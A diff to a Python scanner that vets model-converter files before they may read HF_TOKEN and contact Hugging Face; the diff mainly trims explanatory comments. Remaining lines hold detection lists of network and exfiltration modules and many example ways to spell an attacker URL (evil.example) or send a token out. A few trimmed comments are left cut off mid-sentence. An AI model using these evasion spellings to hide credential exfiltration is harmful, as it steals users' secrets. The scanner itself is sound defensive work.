@@ -125,27 +125,14 @@ RE_NETWORK = re.compile(
     r"|\bhttp\.server\b",
 )
 
-# Hosts a converter legitimately talks to. Upstream's own gguf-py/gguf/utility.py
-# reads HF_TOKEN and sends it to huggingface.co as an Authorization header, which
-# is what downloading a gated model looks like, so the env-harvest rule fired on
-# every clean checkout of llama.cpp master and UNSLOTH_CONVERTER_SCAN_STRICT
-# refused the export.
+# Hosts a converter legitimately talks to.
 MODEL_HUB_HOSTS = frozenset(("huggingface.co", "hf.co"))
 
-# The scheme only. The authority is taken from there to the first URL delimiter
-# and then required to BE a hostname, rather than matched by a pattern that
-# tries to know where a URL ends. Four review rounds found five spellings that
-# ended it early and left only the hub recorded: user information before an @,
-# an uppercase scheme, a bytes literal, a backslash, and a space. Each is a
-# character this now keeps inside the authority, where it fails to look like a
-# hostname and the allowance is refused. Enumerating the spellings was losing;
-# saying what an allowed destination looks like is not.
+# The scheme only.
 RE_URL_SCHEME = re.compile(r"https?://", re.IGNORECASE)
 RE_AUTHORITY_END = re.compile(r"[/?#]")
 
-# How far back a scheme can reach from its separator. The longest one anybody
-# writes is a few characters, and reading a hole this far back is what catches
-# a scheme supplied a character at a time.
+# How far back a scheme can reach from its separator.
 MAX_SCHEME = 12
 RE_HOSTNAME = re.compile(r"^[A-Za-z0-9.\-]+(?::[0-9]+)?$")
 # A URL whose authority is already over: what follows cannot change the host.
@@ -153,17 +140,10 @@ RE_AUTHORITY_CLOSED = re.compile(r"https?://[^/?#]*[/?#]", re.IGNORECASE)
 
 
 # Network APIs the allowance cannot vouch for, so their presence refuses it.
-#
 # socket and http.client name their destination as a bare host rather than a
 # URL: a file could carry a hub URL and open socket.create_connection((
 # "evil.example", 443)) beside it, and the allowance would call that talking
-# only to the hub.
-#
-# urllib is here for the other half of the question. It expresses a write as
-# Request(..., data = ...), Request(..., method = "POST") or urlopen(..., data =
-# ...), none of which is an attribute called post, so the write check below
-# cannot see them. Neither API appears anywhere in the real gguf-py or
-# conversion packages, so refusing on them costs nothing upstream.
+# only to the hub. urllib is here for the other half of the question.
 RE_UNVOUCHABLE_NETWORK = re.compile(
     r"\bsocket\s*\.\s*(?:socket|create_connection)\b"
     r"|\bhttp\.(?:client|server)\b"
@@ -174,11 +154,8 @@ RE_UNVOUCHABLE_NETWORK = re.compile(
 
 # Primitives that build a string, and so a host, out of view of the folding in
 # _literal_text: bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65")
-# .decode() is "https://evil.example" with no URL anywhere in the source for the
-# literal walk to read. Folding each of them would mean an evaluator; refusing
-# them costs nothing, because none appears anywhere in the real gguf-py or
-# conversion packages, and the allowance is for a file that names its
-# destination plainly, which none of these does.
+# .decode() is "https://evil.example" with no URL anywhere in the source for
+# the literal walk to read.
 RE_UNVOUCHABLE_STRING_BUILD = re.compile(
     r"\bfromhex\s*\("
     r"|\bunhexlify\s*\("
@@ -196,9 +173,7 @@ RE_UNVOUCHABLE_STRING_BUILD = re.compile(
 
 
 # The shape the allowance is actually for: a token-authenticated READ from the
-# hub. Anything else sent to a writable multi-tenant host is not obviously
-# benign, since a write-capable token can create a public repo there and use it
-# as a channel any attacker can read back.
+# hub.
 HUB_TOKEN_ENV_NAMES = frozenset((
     "HF_TOKEN", "HUGGING_FACE_HUB_TOKEN", "HUGGINGFACE_HUB_TOKEN", "HF_HUB_TOKEN",
 ))
@@ -207,8 +182,6 @@ HUB_TOKEN_ENV_NAMES = frozenset((
 # Session.send(Request("POST", ...).prepare()) and httpx Client.stream("POST",
 # ...) are writes the named methods do not cover, and reading the method out of
 # any of them would mean following an argument that need not be a literal.
-# Upstream names none of these anywhere at all, in any position, so taking every
-# one of them as a write costs nothing there.
 WRITE_METHODS = frozenset((
     "post", "put", "patch", "delete", "request", "send", "stream",
 ))
@@ -218,10 +191,7 @@ WRITE_METHODS = frozenset((
 # leaves behind, which _env_reads does not inspect.
 ENV_ALIAS_NAMES = frozenset(("environ", "getenv", "environb", "getenvb"))
 
-# Introspection, which is the only way a docstring becomes a value. Spelling
-# them out one at a time was losing: __doc__, fn.__doc__, getattr(fn,
-# "__doc__"), vars(fn)["__doc__"] and inspect.getdoc(fn) all read the same
-# string. Naming any of these at all keeps docstrings in the scan.
+# Introspection, which is the only way a docstring becomes a value.
 DOCSTRING_READERS = frozenset((
     "__doc__", "vars", "__dict__", "inspect", "pydoc", "getdoc", "help",
     "__getattribute__",
@@ -239,22 +209,10 @@ def _is_os_environ(node):
 
 
 def _env_reads(tree):
-    """`(names, dynamic)` for the environment this file reads by name.
-
-    `dynamic` is set when a read names its variable at runtime, as in
-    os.environ[SECRET_NAME]. Nothing here can say which variable that is, and an
-    unattributable read used to pass the allow-list by leaving the set empty.
-
-    Only os.environ and os.getenv count. Any object's .get() used to, so an
-    ordinary config.get("API_KEY") beside a normal hub download read as an
-    environment secret and put the false positive back.
-    """
+    """`(names, dynamic)` for the environment this file reads by name."""
     names, dynamic = set(), False
     # Every os.environ in the file, and the ones this walk actually accounts
-    # for. `env = os.environ` followed by env["AWS_SECRET_ACCESS_KEY"] reads a
-    # credential this never sees, and the short name set then satisfied the
-    # allow-list. An os.environ that is passed around rather than subscripted
-    # here is a read this cannot attribute, which is the same as a dynamic one.
+    # for.
     environs = {
         id(node) for node in ast.walk(tree)
         if isinstance(node, ast.Attribute) and node.attr == "environ"
@@ -277,14 +235,9 @@ def _env_reads(tree):
             )
             if is_env_get:
                 accounted.add(id(func.value))
-            # Only .get(). Marking every method on os.environ as accounted for
-            # let .values() collect every secret and .pop("AWS_SECRET_ACCESS_KEY")
-            # take a named one, with the collected set still reading HF_TOKEN
-            # alone. Anything else leaves that os.environ unaccounted, which
-            # makes the reads dynamic and refuses the allowance.
+            # Only .get().
             if func.attr in ("getenv", "getenvb") and not is_getenv:
-                # import os as o, then o.getenv("AWS_SECRET_ACCESS_KEY"). The
-                # receiver says nothing, so neither does the name it reads.
+                # import os as o, then o.getenv("AWS_SECRET_ACCESS_KEY").
                 dynamic = True
                 continue
             if not (is_env_get or is_getenv):
@@ -312,25 +265,13 @@ def _env_reads(tree):
 
 
 def _writes_anything(tree):
-    """Whether this file so much as NAMES a write method.
-
-    Matching only receivers spelled `session` or `client` missed
-    `s = requests.Session(); s.post(...)`, which is the writable-hub channel
-    this is here to refuse. Matching only CALLS then missed the same write one
-    rename later: `post = requests.post` and `from requests import post` both
-    leave the call site an ast.Name, so post(HUB, data = os.environ["HF_TOKEN"])
-    read as no write at all. Following the alias means following assignment
-    through every shape; naming one at all is enough to refuse, and the 21 real
-    gguf-py and converter modules contain no reference to any of these names,
-    in any position, so it costs nothing upstream.
-    """
+    """Whether this file so much as NAMES a write method."""
     return any(
         (isinstance(node, ast.Attribute) and node.attr in WRITE_METHODS)
         or (isinstance(node, ast.Name) and node.id in WRITE_METHODS)
         # vars(requests)["post"] and requests.__dict__["post"] leave the method
         # name as a string and nothing else, and "po" + "st" is the same string
-        # spelled to miss a Constant check. None of these names appears as a
-        # string constant anywhere in the 21 real modules either.
+        # spelled to miss a Constant check.
         or _literal_text(node) in WRITE_METHODS
         or (
             isinstance(node, ast.ImportFrom)
@@ -340,31 +281,21 @@ def _writes_anything(tree):
     )
 
 
-# Modules whose attributes are the things this refuses by name. A getattr on
-# one of them with a name this cannot read is a lookup this cannot vouch for.
+# Modules whose attributes are the things this refuses by name.
 SENSITIVE_MODULES = frozenset(("os", "requests", "httpx", "urllib", "socket"))
 
 
 # Modules whose members name a destination as a bare host, or write in a way
-# the method names cannot see. urllib.parse is deliberately absent: it is string
-# manipulation, RE_NETWORK excludes it for the same reason, and upstream's
-# utility.py imports urlparse from it twice.
-# Clients whose destination is a bare host rather than a URL this can read, so
-# no walk over the literals can say where they send. smtplib.SMTP(
-# "evil.example").sendmail(..., os.environ["HF_TOKEN"]) is a whole exfiltration
-# beside an honest hub download. requests, httpx and aiohttp are deliberately
-# absent: they take a URL, which this reads.
+# the method names cannot see. urllib.parse is deliberately absent: it is
+# string manipulation, RE_NETWORK excludes it for the same reason, and
+# upstream's utility.py imports urlparse from it twice.
 UNVOUCHABLE_MODULES = (
     "socket", "http.client", "http.server", "urllib.request",
     "smtplib", "ftplib", "poplib", "imaplib", "nntplib", "telnetlib",
     "xmlrpc.client", "paramiko", "pysftp", "websocket", "websockets",
 )
 
-# The same door for the string builders. RE_UNVOUCHABLE_STRING_BUILD reads
-# qualified spellings, so `from base64 import b64decode as d` left it nothing to
-# match and `d("aHR0cHM6...")` decoded an attacker URL beside an unused hub
-# literal. Modules whose members rebuild a string, and the member names that do
-# it under any module. Upstream imports none of these anywhere.
+# The same door for the string builders.
 STRING_BUILDER_MODULES = (
     "base64", "binascii", "codecs", "quopri", "uu", "struct",
 )
@@ -377,24 +308,12 @@ STRING_BUILDER_NAMES = frozenset((
 
 # Functions that BUILD a URL out of one. urlparse and urlsplit are not here:
 # upstream reads its URL with urlparse, and reading one is not rebuilding it.
-# The methods a URL OBJECT is rewritten by. httpx.URL(HUB).copy_with(host =
-# "evil.example") and yarl.URL(HUB).with_host(...) wrap the carrier in a call
-# first, and a carrier deliberately does not survive a call: upstream writes
-# cls.get_list_tensors(url).items() and response = requests.get(url), and
-# tracking what came back out of those refused the very file this exists for.
-# So the receiver is searched for a carrier only when the method is one that
-# rebuilds a URL, which none of upstream's calls on a URL are. _replace is
-# here for the namedtuple urlparse returns.
-# The result objects urlsplit and urlparse return, which assemble a whole
-# destination out of fields with no URL literal anywhere:
-# ParseResult("https", "evil.example", "/c", "", "", "").geturl(). Upstream
-# reads .scheme and .netloc off a parse result and never calls geturl.
 URL_ASSEMBLERS = frozenset((
     "ParseResult", "SplitResult", "ParseResultBytes", "SplitResultBytes",
     "DefragResult", "DefragResultBytes", "geturl",
     # And the URL objects the clients build, which take their host as a field:
     # httpx.URL(scheme = "https", host = "evil.example") spells a destination
-    # no argument of which is a URL. Upstream builds none of these.
+    # no argument of which is a URL.
     "URL", "Url", "URI", "Uri",
 ))
 
@@ -411,21 +330,14 @@ URL_BUILDERS = frozenset((
 
 
 def _dynamic_imports(tree, aliases = None):
-    """`(names, unreadable)` for every import spelled as a call.
-
-    __import__("smtplib") and importlib.import_module("smtplib") bind a module
-    with no Import node anywhere, so every check that reads the import lines saw
-    nothing at all. A name this cannot read is worse than a known one, so it
-    counts as unreadable rather than as no import.
-    """
+    """`(names, unreadable)` for every import spelled as a call."""
     if aliases is None:
         aliases = _call_aliases(tree)
     names, unreadable = set(), False
     for node in ast.walk(tree):
         # builtins.__dict__["__import__"]("smtplib") leaves the importer as a
         # string and nothing else, exactly as the write methods and the
-        # environment names did. Neither name appears as a string constant
-        # anywhere in the 21 real modules.
+        # environment names did.
         if _literal_text(node) in ("__import__", "import_module"):
             return set(), True
         if not isinstance(node, ast.Call):
@@ -442,8 +354,7 @@ def _dynamic_imports(tree, aliases = None):
 
 # Connection APIs that name a bare host from a module too ordinary to refuse
 # whole: asyncio is imported for all sorts of reasons, and open_connection(
-# "evil.example", 443) is not one of them. Checked by name, through aliases,
-# so the from-import and the qualified call are the same thing.
+# "evil.example", 443) is not one of them.
 BARE_HOST_APIS = frozenset((
     "open_connection", "open_unix_connection", "create_connection",
     "create_unix_connection", "start_server", "start_unix_server",
@@ -452,13 +363,7 @@ BARE_HOST_APIS = frozenset((
 
 
 def _imports_an_unvouchable_api(tree, aliases = None):
-    """Whether a connection API arrives by from-import.
-
-    RE_UNVOUCHABLE_NETWORK reads qualified spellings, so
-    `from socket import create_connection` left nothing for it to match, and
-    `import socket as s` left it only `s.create_connection`, which it does not
-    recognise either. Both let a token go to a bare host beside a benign hub GET.
-    """
+    """Whether a connection API arrives by from-import."""
     def unvouchable(name):
         return any(
             name == module or name.startswith(module + ".")
@@ -494,19 +399,7 @@ def _imports_an_unvouchable_api(tree, aliases = None):
 
 
 def _builds_text_from_numbers(tree):
-    """Whether text is assembled out of character codes.
-
-    bytearray([104, 116, 116, 112, 115]).decode() is a URL with no URL in it,
-    and so is "".join(chr(c) for c in codes). The existing obfuscation rule
-    wants exec or eval beside it, which this needs nothing of: the destination
-    is simply spelled in numbers.
-
-    Narrow at the receiver, because upstream really does write
-    bytearray(get_data_by_range(...)) in the one file this allowance reaches:
-    only a container of values written out in the source counts, never bytes
-    that came back from a call. chr is refused outright, and appears in
-    vocab.py and nowhere that harvests the environment.
-    """
+    """Whether text is assembled out of character codes."""
     for node in ast.walk(tree):
         if (
             isinstance(node, ast.Name) and node.id == "chr"
@@ -530,12 +423,7 @@ def _builds_text_from_numbers(tree):
 
 
 def _templates_are_oversized(tree):
-    """Whether any formatting template is longer than this will parse.
-
-    Checked by length alone, before anything materialises the fields: the
-    template is the input, and a megabyte of repeated {} is half a million
-    tuples out of a file the scan accepts at up to 8 MiB.
-    """
+    """Whether any formatting template is longer than this will parse."""
     for node in ast.walk(tree):
         if (
             isinstance(node, ast.Call)
@@ -558,20 +446,7 @@ def _templates_are_oversized(tree):
 
 
 def _joins_something_unreadable(tree):
-    """Whether a literal separator joins pieces this cannot enumerate.
-
-    "".join(x for x in ("https", "://evil.example/c")) is a whole URL, and the
-    walk sees two pieces neither of which carries a scheme. Only a sequence
-    written out is folded, and returning no text for anything else left the
-    destination unnamed rather than unreadable.
-
-    The separator is read too: str().join(("htt", "ps://evil.example/c")) is a
-    URL whose scheme is broken in the middle by the hole the separator folded
-    to, so nothing matched a scheme there either.
-
-    One argument, which leaves os.path.join(a, b) alone. No file that reaches
-    this allowance joins anything: gguf-py/gguf/utility.py has no .join at all.
-    """
+    """Whether a literal separator joins pieces this cannot enumerate."""
     for node in ast.walk(tree):
         if not (
             isinstance(node, ast.Call)
@@ -593,12 +468,7 @@ def _joins_something_unreadable(tree):
 
 
 def _call_aliases(tree, assignments = None):
-    """`{local name: original name}` for imports and for rebinding assignments.
-
-    `from importlib import import_module as im` leaves the dynamic import
-    spelled im(...), and `j = urljoin` rebinds a builder with no import in
-    sight. Both are the same question a call site asks: what is this really.
-    """
+    """`{local name: original name}` for imports and for rebinding assignments."""
     aliases = _import_aliases(tree)
     for name, value in (assignments or _single_assignments(tree)).items():
         if isinstance(value, ast.Name):
@@ -618,12 +488,7 @@ def _called_name(node, aliases):
 
 
 def _import_aliases(tree):
-    """`{local name: imported name}` for every alias an import binds.
-
-    `from urllib.parse import urljoin as j` leaves the call spelled j(...), and
-    comparing the call site against a set of builder names missed it, exactly as
-    the decoder and docstring checks missed their own aliases.
-    """
+    """`{local name: imported name}` for every alias an import binds."""
     aliases = {}
     for node in ast.walk(tree):
         if isinstance(node, (ast.Import, ast.ImportFrom)):
@@ -634,13 +499,7 @@ def _import_aliases(tree):
 
 
 def _imports_a_string_builder(tree, aliases = None):
-    """Whether a string decoder arrives by import, under any name.
-
-    An alias erases the only spelling RE_UNVOUCHABLE_STRING_BUILD can read: with
-    `from base64 import b64decode as d` the call is `d(...)`, and with
-    `import base64 as b` it is `b.b64decode(...)`. Either one decoded an
-    attacker URL while an unused hub literal still granted the allowance.
-    """
+    """Whether a string decoder arrives by import, under any name."""
     def builder_module(name):
         return any(
             name == module or name.startswith(module + ".")
@@ -668,15 +527,7 @@ def _imports_a_string_builder(tree, aliases = None):
 
 
 def _reaches_through_getattr(tree):
-    """Whether a write or the environment is reached by a computed lookup.
-
-    `f = getattr(requests, "post")` holds no Attribute and no Name spelled post,
-    so the write checks saw nothing and a POST of HF_TOKEN to the hub scanned
-    clean. A constant name is read here and refused; a name that is NOT constant
-    is refused only on the modules above, because upstream calls getattr with a
-    computed name nine times, all on its own objects, and refusing those would
-    refuse real converter modules.
-    """
+    """Whether a write or the environment is reached by a computed lookup."""
     for node in ast.walk(tree):
         if not (
             isinstance(node, ast.Call)
@@ -699,18 +550,7 @@ def _reaches_through_getattr(tree):
 
 
 def _aliases_the_environment(tree):
-    """Whether the environment is reachable here under another name.
-
-    `getenv = os.getenv` and `from os import getenv` both leave the read an
-    ast.Name, which _env_reads does not inspect, so getenv("AWS_SECRET_ACCESS_KEY")
-    beside a legitimate os.environ["HF_TOKEN"] left the collected set holding the
-    hub token alone and the allowance was granted. `from os import environ` does
-    the same to the subscript form.
-
-    `os.environ` and `os.getenv` themselves are attributes and are unaffected:
-    this is about the bare name. Upstream reads the environment only through
-    os.environ, so refusing the aliases costs nothing.
-    """
+    """Whether the environment is reachable here under another name."""
     called = {
         id(node.func) for node in ast.walk(tree)
         if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
@@ -718,18 +558,15 @@ def _aliases_the_environment(tree):
     return any(
         (isinstance(node, ast.Name) and node.id in ENV_ALIAS_NAMES)
         # vars(os)["environ"] and os.__dict__["environ"] leave the name as a
-        # string and nothing else, and "en" + "viron" is the same string spelled
-        # to miss a Constant check. None of these appears as a string constant
-        # in the 21 real modules.
+        # string and nothing else, and "en" + "viron" is the same string
+        # spelled to miss a Constant check.
         or _literal_text(node) in ENV_ALIAS_NAMES
         or (
             isinstance(node, ast.ImportFrom)
             and any(alias.name in ENV_ALIAS_NAMES for alias in node.names)
         )
         # read_secret = os.getenv keeps no reserved spelling anywhere, so the
-        # name it lands under says nothing. An os.getenv that is not called
-        # right here is one going somewhere this does not follow. os.environ is
-        # already covered: _env_reads counts every one it did not account for.
+        # name it lands under says nothing.
         or (
             isinstance(node, ast.Attribute)
             and node.attr in ("getenv", "getenvb", "environb")
@@ -739,49 +576,25 @@ def _aliases_the_environment(tree):
     )
 
 
-# Only %s, %r and %% are folded below, under a mapping key or without one. A
-# width turns "%2000000000d" % 1 into a two gigabyte string, and reading a file
-# is not a reason to allocate one. The key has to be skipped over rather than
-# read as the conversion: "%(host)s" is an ordinary %s, and calling it unsafe
-# left every mapping template unfoldable, holes and all.
+# Only %s, %r and %% are folded below, under a mapping key or without one.
 RE_UNSAFE_PERCENT = re.compile(r"%(?:\([^)]*\)[^sr%]|(?!\()[^sr%])")
 
-# Stands in for a piece of a string this cannot read. It is not a hostname
-# character, so a destination interrupted by one fails the hostname check
-# instead of being read as the text on either side of the hole.
+# Stands in for a piece of a string this cannot read.
 UNKNOWN_PIECE = "\x00"
 
-# Passes over the tree allowed to settle which names carry a URL. See
-# _reshapes_a_url: real files need one or two.
+# Passes over the tree allowed to settle which names carry a URL.
 MAX_CARRIER_PASSES = 16
 
-# Ceiling on a folded join. A join multiplies, unlike + and %, whose result is
-# bounded by the source that spells it: a 100 KB separator with 10000 elements
-# is 130 KB of source and a 1 GB string, which took 15.7 seconds and 1.7 GB of
-# resident memory inside the decision about whether an export may run. Over the
-# ceiling the join is simply not folded, so the walk reads its separator and its
-# elements individually and a destination inside one is still seen.
+# Ceiling on a folded join.
 MAX_FOLDED_JOIN = 1 << 20
 
 
-# A template longer than this is not parsed at all. Formatter().parse turns a
-# 1 MiB template of repeated {} into half a million tuples before any output
-# check can run, and the scan accepts sources up to 8 MiB. No converter writes
-# a 64 KiB format string, and one that does is refused rather than read.
+# A template longer than this is not parsed at all.
 MAX_TEMPLATE = 1 << 16
 
 
 class _FoldBudgetExceeded(Exception):
-    """Raised when one allowance decision has folded more text than it may.
-
-    Each fold carries its own output ceiling, and the destination walk charges
-    what it reads against a shared budget, but the folding itself happens in
-    several places: the carrier fixpoint alone reads every assignment in the
-    file up to sixteen times. Two hundred joins of a megabyte apiece are inside
-    every individual ceiling and still hundreds of megabytes of work. The
-    budget is on the work, and running out of it refuses, since the caller
-    turns any exception here into "do not suppress anything".
-    """
+    """Raised when one allowance decision has folded more text than it may."""
 
 
 # Generous next to a real converter, which folds a few kilobytes: the whole
@@ -806,18 +619,7 @@ def _charge_fold(text):
 
 
 def _fields_are_plain(template):
-    """Whether every replacement field is a bare name, with no spec at all.
-
-    A spec is not folded: "{:>1000000000}".format("x") is a gigabyte, and a
-    converter that needs one of those in a URL does not exist. Read with the
-    formatter rather than a pattern, because a pattern cannot see into a NESTED
-    spec: "{0:{1}}".format("x", "10000000000") has one, the character classes
-    could not span the inner braces, the length estimate stayed tiny, and
-    formatting it took 8.5 seconds and ten gigabytes.
-
-    Upstream formats with plain fields in 15 places, so folding rather than
-    refusing is what keeps those files readable here.
-    """
+    """Whether every replacement field is a bare name, with no spec at all."""
     if len(template) > MAX_TEMPLATE:
         return False                    # too long to read, so never folded
     try:
@@ -838,7 +640,6 @@ def _longest_argument(node):
 
 
 # One percent conversion, in the full printf shape the operator accepts:
-# "%(name)-#010.3lf" is one field and "%%" is an escaped sign, not a field.
 RE_PERCENT_FIELD = re.compile(
     r"%(?:\((?P<key>[^)]*)\))?[-#0 +]*(?:\d+|\*)?(?:\.(?:\d+|\*))?[hlL]?"
     r"[diouxXeEfFgGcrsa]"
@@ -846,14 +647,7 @@ RE_PERCENT_FIELD = re.compile(
 
 
 def _percent_is_oversized(template, values):
-    """Whether this formatting would materialise more than the fold ceiling.
-
-    The aggregate budget is spent on what the walk READS, and the operator runs
-    before that: a 53 KB source with a thousand %(x)s fields and a 50 KB value
-    built 50 MB first, and both factors scale inside the 8 MiB the scan accepts.
-    The estimate is one longest value per field, which is exact for %s and %r
-    and the only conversions folded here.
-    """
+    """Whether this formatting would materialise more than the fold ceiling."""
     if len(template) > MAX_TEMPLATE:
         return True                     # too long to read, so never folded
     fields = len(RE_PERCENT_FIELD.findall(template))
@@ -862,14 +656,7 @@ def _percent_is_oversized(template, values):
 
 
 def _percent_holes(template):
-    """The template with each percent conversion replaced by a hole.
-
-    Returning None for a formatting this cannot evaluate read as no text at all,
-    where the join and the f-string leave holes: "%s://%s" % (scheme, host)
-    spells its own scheme that way and no literal carried a URL. It also refused
-    honest code, since "/api/models/%s" % name appended to the hub URL was text
-    the authority check could not read either.
-    """
+    """The template with each percent conversion replaced by a hole."""
     pieces, index = [], 0
     for match in RE_PERCENT_FIELD.finditer(template):
         pieces.append(template[index:match.start()])
@@ -896,14 +683,7 @@ OPERATOR_METHODS = {
 
 
 def _operator_text(node):
-    """The text of an operator spelled as a call, or None.
-
-    operator.add("https", "://evil.example/c"), "https".__add__(...) and
-    operator.mod("%s://%s/c", ("https", "evil.example")) build the same strings
-    the operators do, and reading only the operators left no literal holding a
-    URL. Folded by standing the operator back up and reading that, so the
-    ceilings and the holes are the ones the operator already has.
-    """
+    """The text of an operator spelled as a call, or None."""
     if not (
         isinstance(node, ast.Call)
         and not node.keywords
@@ -922,19 +702,7 @@ def _operator_text(node):
 
 
 def _replace_text(node):
-    """The text of a literal `"...".replace(old, new)`, or None.
-
-    "httpsX//evil.example/c".replace("X", ":") is a URL whose scheme does not
-    exist until the call runs, so the walk read a literal with no scheme in it
-    and recorded no destination at all while a hub literal elsewhere granted the
-    allowance. Folding it reads the destination the way the join, the f-string
-    and the format fold do.
-
-    Only a literal receiver with literal arguments. Upstream's replaces are all
-    `parameter.replace(" ", "-")`, whose receiver is not a literal, so this
-    never reaches them; a literal receiver whose arguments cannot be read is
-    refused outright in _reshapes_a_url instead.
-    """
+    """The text of a literal `"...".replace(old, new)`, or None."""
     if not (
         isinstance(node, ast.Call)
         and isinstance(node.func, ast.Attribute)
@@ -957,22 +725,7 @@ def _replace_text(node):
 
 
 def _rewrites_a_constant(node, aliases = None):
-    """Whether a literal string is transformed into text this cannot read.
-
-    Named methods were losing one at a time, and the constructors spell the
-    same transformation with no method in sight. replace with dynamic arguments,
-    decode of UTF-16 bytes, split indexed back together, and then ljust(6, ":")
-    turning "https" into a scheme: the tail of string methods that build a URL
-    out of a constant has no end, so this asks the other question. The receiver
-    is a literal, the result is not readable, and a transformation this cannot
-    follow is not one it can vouch for.
-
-    Everything the folds do read stays readable: format, join, replace with
-    literal arguments and the operator methods all return text. Upstream is
-    unaffected because it transforms parameters, never constants: every
-    .replace(), .strip() and .format() receiver in gguf-py/gguf/utility.py is
-    an argument, and what it decodes and splits came back from the hub.
-    """
+    """Whether a literal string is transformed into text this cannot read."""
     if not isinstance(node, ast.Call):
         return False
     if isinstance(node.func, ast.Attribute):
@@ -989,13 +742,7 @@ def _rewrites_a_constant(node, aliases = None):
 
 
 def _format_holes(node, template):
-    """The template with every field replaced by a hole, or None.
-
-    Returning None for a format this cannot evaluate was the one builder that
-    read as no text at all, where the join and the f-string both leave holes.
-    "{p[s]}://{p[h]}".format(p = parts) spells its own scheme that way, and no
-    literal in the file then carried a URL for the walk to refuse.
-    """
+    """The template with every field replaced by a hole, or None."""
     if len(template) > MAX_TEMPLATE:
         return None
     try:
@@ -1011,13 +758,7 @@ def _format_holes(node, template):
 
 
 def _format_text(node):
-    """The text of a literal `"...".format(...)`, or None.
-
-    Upstream spells plenty of strings this way, so refusing the builder would
-    refuse real converter modules. Folding it reads the destination instead:
-    "{}://{}".format("https", "evil.example/collect") carries its scheme in no
-    single piece, exactly like the join and f-string splits.
-    """
+    """The text of a literal `"...".format(...)`, or None."""
     if not (
         isinstance(node, ast.Call)
         and isinstance(node.func, ast.Attribute)
@@ -1046,9 +787,7 @@ def _format_text(node):
         try:
             return template.format_map(mapping)
         except Exception:
-            # Any exception at all: "{0[x]}".format("a") raises TypeError, and
-            # one unreachable expression like it made the whole scan raise,
-            # which the caller turns into "continue with no findings".
+            # Any exception at all:
             return _format_holes(node, template)
     arguments = [_literal_text(argument) for argument in node.args]
     keywords = {
@@ -1066,11 +805,7 @@ def _format_text(node):
 
 
 def _join_nodes(node):
-    """`(separator, elements)` for `sep.join([...])`, or None.
-
-    Only a sequence written out here: `"".join(parts)` names elements this
-    cannot enumerate, and nothing is gained by pretending otherwise.
-    """
+    """`(separator, elements)` for `sep.join([...])`, or None."""
     if not (
         isinstance(node, ast.Call)
         and isinstance(node.func, ast.Attribute)
@@ -1110,16 +845,7 @@ def _literal_text(node):
 
 
 def _literal_text_uncharged(node):
-    """The text a constant expression evaluates to, or None when it is not one.
-
-    `+` and `%` are folded because ast.parse does not fold them: "https://" +
-    "evil.example/collect" is two Constants, neither of which names a host, so
-    that destination was recorded as no destination at all while a hub literal
-    elsewhere in the file still granted the allowance. Same for "%s://%s" %
-    ("https", "evil.example"), which spells the scheme itself past the check.
-    An operand that is not a literal makes the whole expression unreadable here,
-    which leaves it exactly where the dynamic destinations already sit.
-    """
+    """The text a constant expression evaluates to, or None when it is not one."""
     if isinstance(node, ast.Constant):
         if isinstance(node.value, str):
             return node.value
@@ -1130,10 +856,8 @@ def _literal_text_uncharged(node):
         # An f-string is the one construction that arrived here already split.
         # f"https://{''}evil.example/log" left the scheme in one constant piece
         # and the whole attacker hostname, in plain sight, in another that no
-        # longer had a scheme in front of it, so no host was read from it at all
-        # and a hub literal elsewhere granted the allowance. A piece whose value
-        # is not a literal becomes UNKNOWN_PIECE rather than nothing, so the
-        # text around a hole is never read as though the hole were not there.
+        # longer had a scheme in front of it, so no host was read from it at
+        # all and a hub literal elsewhere granted the allowance.
         pieces = []
         for part in node.values:
             if isinstance(part, ast.FormattedValue):
@@ -1153,11 +877,9 @@ def _literal_text_uncharged(node):
         return formatted
     parts = _join_parts(node)
     if parts is not None:
-        # "".join(("htt", "ps://ev", "il.exa", "mple/c")) is a URL spelled out in
-        # full whose scheme never appears in any one piece, so nothing matched
-        # RE_URL_SCHEME and nothing was recorded as a destination. Read like an
-        # f-string: a piece that cannot be read is a hole, never a reason to
-        # treat the pieces around it as the whole string.
+        # "".join(("htt", "ps://ev", "il.exa", "mple/c")) is a URL spelled out
+        # in full whose scheme never appears in any one piece, so nothing
+        # matched RE_URL_SCHEME and nothing was recorded as a destination.
         separator, elements = parts
         return separator.join(elements)
     operated = _operator_text(node)
@@ -1166,8 +888,7 @@ def _literal_text_uncharged(node):
     if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Mult):
         # "https" * 1 + "://evil.example/c" carries its scheme in a repetition,
         # which was neither folded nor refused, so no literal in the file held
-        # a URL. Either operand may be the count, and one this cannot read
-        # leaves a hole, exactly as an unreadable f-string piece does.
+        # a URL.
         for text_side, count_side in (
             (node.left, node.right), (node.right, node.left),
         ):
@@ -1180,10 +901,7 @@ def _literal_text_uncharged(node):
                 and not isinstance(count_side.value, bool)
             ) else None
             if count is None:
-                # The text itself and then a hole. Returning only a hole made
-                # the multiplication look fully read, so the walk skipped its
-                # children and "https://evil.example/c" * n named nothing at
-                # all, while at runtime one repetition is the whole URL.
+                # The text itself and then a hole.
                 return text + UNKNOWN_PIECE
             if count < 0:
                 return ""
@@ -1206,10 +924,7 @@ def _literal_text_uncharged(node):
     if RE_UNSAFE_PERCENT.search(left):
         return _percent_holes(left)
     if isinstance(node.right, ast.Dict):
-        # "%(scheme)s://%(host)s/c" % {"scheme": "https", "host": "evil.example"}
-        # is a whole URL whose scheme is spelled by the template and whose host
-        # is spelled by the mapping, and neither half is a destination on its
-        # own. Only the tuple form was folded, so this one read as no URL at all.
+        # "%(scheme)s://%(host)s/c" % {"scheme":
         mapping = {}
         for key, value in zip(node.right.keys, node.right.values):
             name = _literal_text(key) if key is not None else None
@@ -1236,12 +951,7 @@ def _literal_text_uncharged(node):
 
 
 def _mapping_key(node):
-    """The literal string key of a Subscript, or None for anything else.
-
-    A dictionary lookup by name reads a value out. A slice, an index, or a key
-    this cannot read takes the string apart, which is what BASE[:8] does, so
-    only the named lookup is treated as a read rather than a reshape.
-    """
+    """The literal string key of a Subscript, or None for anything else."""
     if not isinstance(node, ast.Subscript):
         return None
     key = _literal_text(node.slice)
@@ -1249,12 +959,7 @@ def _mapping_key(node):
 
 
 def _bound_names(target):
-    """Every name an assignment target binds, unpacking included.
-
-    `BASE, = ("https://huggingface.co",)` binds BASE through a Tuple, and
-    reading only bare Name targets lost the carrier. An attribute target gives
-    its attribute name, which is what carries() matches for cls.BASE_DOMAIN.
-    """
+    """Every name an assignment target binds, unpacking included."""
     if isinstance(target, ast.Name):
         return {target.id}
     if isinstance(target, ast.Attribute):
